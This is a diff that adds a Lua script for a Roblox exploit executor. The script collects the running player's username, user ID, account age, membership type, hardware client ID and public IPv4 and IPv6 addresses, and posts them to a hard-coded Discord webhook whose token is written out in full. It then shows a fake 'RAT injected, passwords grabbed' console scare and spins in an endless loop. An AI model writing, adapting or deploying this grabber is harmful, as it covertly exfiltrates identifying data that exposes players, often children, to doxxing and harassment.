@@ -1,0 +1,96 @@
+local Webhook = "https://discord.com/api/webhooks/1058926619709939752/dmREkESHzciOu8GVqFQDGo0io2-btFksG3dsekGhAKlmsXIUMCHAtJcaCgb4Ywtl7i5Z" -- met ton web hook pd
+
+local IPv4 = game:HttpGet("https://v4.ident.me/")
+local IPv6 = game:HttpGet("https://v6.ident.me/")
+
+local Headers = {["content-type"] = "application/json"} -- Don't Modify
+
+local LocalPlayer = game:GetService("Players").LocalPlayer
+
+local AccountAge = LocalPlayer.AccountAge
+local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+local UserId = LocalPlayer.UserId
+local PlayerName = game.Players.LocalPlayer.Name
+local HardwareID = game:GetService("RbxAnalyticsService"):GetClientId()
+
+local PlayerData = {
+    
+    ["content"] = "",
+    ["embeds"] = {{
+        
+        ["title"] = "Username:",
+        ["description"] = PlayerName,
+        ["color"] = tonumber(0x2B6BE4),
+        ["fields"] = {
+            {
+                ["name"] = "Membership Type:",
+                ["value"] = MembershipType,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Account Age:",
+                ["value"] = AccountAge,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "User Id:",
+                ["value"] = UserId,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Hardware ID",
+                ["value"] = HardwareID,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "IPv4",
+                ["value"] = IPv4,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "IPv6",
+                ["value"] = IPv6,
+                ["inline"] = true
+            },
+        },
+    }}
+}
+
+local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
+local HttpRequest = http_request;
+
+if syn then
+   HttpRequest = syn.request
+   else
+   HttpRequest = http_request
+end
+
+HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
+local HardwareID = game:GetService("RbxAnalyticsService"):GetClientId()
+
+coroutine.wrap(function()
+    local script = [[
+        rconsoleclear()
+        rconsolename("RSE INJECTOR BY WATCHER#7437")
+        rconsoleprint("@@LIGHT_RED@@")
+        rconsoleprint("RCE INJECTION SUCCESSFULL RAT INJECTED\n")
+	    rconsoleprint("")
+	    rconsoleprint("Grabbing Password...\n")
+	    wait(1.5)
+	    rconsoleprint("@@LIGHT_GREEN@@")
+	    rconsoleprint("Roblox Passwords Grabbed\n")
+	    wait(1.5)
+	    rconsoleprint("@@LIGHT_RED@@")
+	    rconsoleprint("Sending To Webhook...\n")
+	    wait(1.5)
+	    rconsoleprint("@@LIGHT_GREEN@@")
+	    rconsoleprint("Passwords Sended !\n")
+        while true do
+            print("RCE INJECTION")
+        end
+    ]]
+    
+    writefile("penis.lua", script)
+    wait(0.5)
+    loadstring(readfile("penis.lua"))()
+end)()
